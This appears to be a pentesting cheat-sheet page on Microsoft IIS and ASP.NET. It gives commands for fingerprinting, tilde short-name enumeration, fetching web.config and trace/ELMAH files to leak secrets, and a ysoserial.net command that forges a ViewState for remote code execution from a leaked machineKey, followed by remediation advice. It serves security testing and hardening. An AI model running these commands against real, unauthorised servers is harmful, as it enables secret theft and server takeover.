---
tags:
  - Web
  - Windows
---

# :material-microsoft: Microsoft IIS

<span class="pill pill-medium">windows web</span> <span class="pill pill-info">web</span>

IIS hosts ASP.NET / classic ASP on Windows. Signature issues: **8.3 short-name
(`~`) disclosure**, verb tampering, and .NET-specific bugs (ViewState, path
handling).

!!! abstract "TL;DR"
    Confirm IIS + .NET version → tilde-enum hidden files/dirs → hit config leaks
    (`web.config`) → attack ViewState if you find a machine key.

## :material-magnify: Identify

```bash
curl -sI http://$TARGET/ | grep -iE 'Microsoft-IIS|X-AspNet|X-Powered'
#   Server: Microsoft-IIS/10.0   X-AspNet-Version: 4.0.30319
nuclei -u http://$TARGET -tags iis,aspnet
```

## :material-file-hidden: 8.3 short-name (tilde) disclosure

IIS can leak the first 6 chars of file/dir names via the legacy 8.3 format —
enough to guess `web.config`, backups, and admin paths.

```bash
# https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://$TARGET/
# a 404 vs 400 difference on http://$TARGET/AAAAAA~1.* reveals valid prefixes
```

## :material-file-cog: Config & source leaks

```bash
# web.config often holds connection strings + the machineKey
curl http://$TARGET/web.config
curl http://$TARGET/web.config.bak http://$TARGET/web.config.old
# trace.axd / elmah.axd leak requests + secrets when left enabled
curl http://$TARGET/trace.axd http://$TARGET/elmah.axd
```

!!! loot "A leaked machineKey = ViewState RCE"
    With the `validationKey`/`decryptionKey` from `web.config`, forge a malicious
    `__VIEWSTATE` with `ysoserial.net` for deserialization RCE.
    ```bash
    ysoserial.exe -p ViewState -g TextFormattingRunProperties \
      --generator=<gen> --validationkey=<key> --validationalg=SHA1 -c "cmd"
    ```
    See [Deserialization](../web/deserialization.md).

## :material-alert: Other checks

```bash
# Verb tampering / PUT+MOVE upload (WebDAV)
curl -X OPTIONS http://$TARGET/ -i          # look for PUT, MOVE
davtest -url http://$TARGET/
# ASP.NET path bugs / padding oracle on older versions (MS10-070)
```

## :material-shield-check: Remediation

- Disable 8.3 name creation; remove `web.config` backups; disable `trace.axd`/ELMAH
  in prod; rotate and protect the machineKey; keep .NET patched.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- ViewState → [Deserialization](../web/deserialization.md); on a shell → [Windows Privesc](../privesc/windows.md).
- Reference: [HackTricks IIS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html).
